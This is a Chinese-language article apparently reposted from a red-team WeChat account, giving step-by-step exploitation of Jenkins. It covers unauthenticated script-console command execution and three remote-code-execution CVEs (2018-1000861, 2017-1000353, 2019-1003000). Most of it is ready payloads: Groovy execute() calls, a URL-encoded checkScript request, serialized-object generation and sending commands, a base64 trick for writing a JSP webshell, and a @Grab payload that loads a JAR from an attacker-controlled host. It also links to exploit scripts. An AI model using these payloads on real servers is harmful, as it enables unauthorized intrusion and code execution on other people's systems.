> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OOBEN_cwqmvo5RwviGkFkA)

**一、未授权访问**

访问 url：

```
http://172.16.20.134:8080/script
```

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5ickdLjIF8CE4E9zacYLO775ylibrT2k1SUVwNC7BeWiaS3s538pGO3DYNFJToYc3aEazZx7UQSdSfSMQ/640?wx_fmt=png)

命令执行

```
println "ls -al".execute().text
```

也可以利用 powershell 或者 python 脚本反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5ickdLjIF8CE4E9zacYLO775yF7pb02W2wVMfNCbjXNEqYBRGMrVvhLUwoTVhibBqT1ahvQT9TibEqkVQ/640?wx_fmt=png)

**二、CVE-2018-1000861 远程命令执行漏洞**

payload:

```
securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript
?sandbox=true
&value=public class x {
public x(){
"touch /tmp/success".execute()
  }
}
```

&value = 转成 url 编码

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5ickdLjIF8CE4E9zacYLO775yfMc89OdIEEFmUeibBtdia57icZKjUhCZic51A2JFO9PtUvibLD0v9XD6yyg/640?wx_fmt=png)

发送 get 请求：

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5ickdLjIF8CE4E9zacYLO775y9UEIEG3yD4PsTJbX9ib5X12hoib9G1CnADicnMW0aFZ0klYcJx2dICIuA/640?wx_fmt=png)

python 脚本：

```
https://github.com/orangetw/awesome-jenkins-rce-2019/blob/master/exp.py
```

**三、CVE-2017-1000353 远程代码执行**

**工具地址：****https://github.com/vulhub/CVE-2017-1000353**

 https://ssd-disclosure.com/archives/3171

```
# 生成ser
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar 1.ser "touch /tmp/1.jsp"

# 发送ser
python exploit.py http://172.16.20.134:8080 1.ser
```

exploit.py 这里要注释下，如果你使用代理的话可以添加，这里只是复现，用不到

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5ickdLjIF8CE4E9zacYLO775y76qrRArfiaNVpoda42Nia309yySMKQ1fJmM9xqMc7jEmIticOflJjqEOQ/640?wx_fmt=png)

 另外一个 linux 写 shell 的小技巧：

```
echo base64后的木马内容 |base64 -d > 1.jsp
```

jsp 生成成功

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5ickdLjIF8CE4E9zacYLO775yicKrjzUMxGc6xKmN5ibJRaDbNOChSXGGbC78MRA3DoucOcdluMOXqlzg/640?wx_fmt=png)

**四、CVE-2019-1003000  远程代码执行漏洞**

漏洞利用

```
http://url.com/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name='payload', root='http://poc.com')%0a
@Grab(group='package', module='payload', version='1')%0a
import Payload;
```

poc.com 是保存了 JAR 文件的服务器域名。

group、module、version 的值对应了该 jar 文件的存放路径。

修改 version 的值，对应的 jar 包的访问路径和文件名也发生改变。

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5ickdLjIF8CE4E9zacYLO775yG9VfNbv1ImxQNrsSJ1r8jWBstQ8PXdSANddQCntHMOqhLcoibsMTdlQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5ickdLjIF8CE4E9zacYLO775yC58Nr5ftWVctxOicklvncc2YOoiavdV4aEMz8k5tc7Ix3qqLC32oLKWA/640?wx_fmt=png)

脚本：https://github.com/wetw0rk/Exploit-Development/blob/master/CVE-2019-1003000%20%26%26%20CVE-2018-1999002%20-%20preAuth%20Jenkins%20RCE/sploit/jenkins-preauth-rce-exploit.py

https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc

```
原文链接：https://www.cnblogs.com/junsec/p/11593556.html
```

**推荐关注 (红队方向)：**

公众号